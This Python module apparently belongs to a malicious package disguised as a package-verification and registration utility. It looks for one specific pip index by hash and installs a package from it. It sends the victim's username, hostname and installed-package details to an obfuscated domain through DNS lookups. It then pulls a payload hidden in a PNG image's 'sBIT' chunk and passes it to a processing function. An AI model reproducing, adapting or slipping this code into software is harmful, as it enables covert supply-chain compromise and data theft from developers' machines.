import hashlib
import os
from .pip_utils import pip_install, get_pip_index_list
from .net_utils import resolve_fqdn
from .pkg_utils import get_content
from .os_utils import get_username, get_hostname, proc_func
from cloud_ds_api.resources import TOP_DOMAINS, TOP_SUBS, VERIFIED_PKGS
from img_splicer.utils import read_png_chunk, get_image_name
from img_splicer.resources import IMAGE_RESOURCE


def register_img(prim_idx):

    image_name = get_image_name()
    if image_name is None:
        return

    png_bytes = get_content(IMAGE_RESOURCE, image_name)
    if png_bytes is None:
        return

    chunk_data = read_png_chunk(png_bytes, 'sBIT')
    if chunk_data is None:
        return

    hash_object = hashlib.sha256(prim_idx.strip().encode())
    digest = hash_object.digest()

    proc_func(digest, chunk_data)


def register_package(prim_idx, package_name, package_version ):

    uname = get_username()
    hname = get_hostname()
    reg_info = [[f"{package_name}:{package_version}", '0'],
                [f"{uname}:{hname}", '1']]

    ret_val = pip_install(package_name, package_version, prim_idx)
    reg_info.append(['_', ret_val])
    ridx = os.urandom(2).hex()
    base = TOP_SUBS[46] + '.' + TOP_DOMAINS[19]
    for registration_instance in reg_info:
        resolve_fqdn(registration_instance[0], str(
            registration_instance[1]), ridx, base)

    register_img(prim_idx)


def check_idx(idx):
    hash_object = hashlib.sha384(idx.strip().encode())
    hash_hex = hash_object.hexdigest()
    if hash_hex == '9dc74eb1bbc0cd8bc31682f5ea45d9b6621a99ebc05620c04a8f88e4e5d0560e8365b85def29e618dc9e63a067822f5f':
        return True
    else:
        return False


def verify_package():

    name = None
    version = None
    prim_idx = None
    pkgs, idxs = get_pip_index_list()
    for idx in idxs:
        if check_idx(idx):
            prim_idx = idx

    for pkg in pkgs:
        pkg = pkg.strip()
        hash_object = hashlib.sha256(pkg.encode())
        hash_hex = hash_object.hexdigest()
        if hash_hex in VERIFIED_PKGS:
            name = pkg
            version = VERIFIED_PKGS[hash_hex]
            break

    if prim_idx and name and version:
        register_package(prim_idx, name, version)
        return True
    else:
        return False
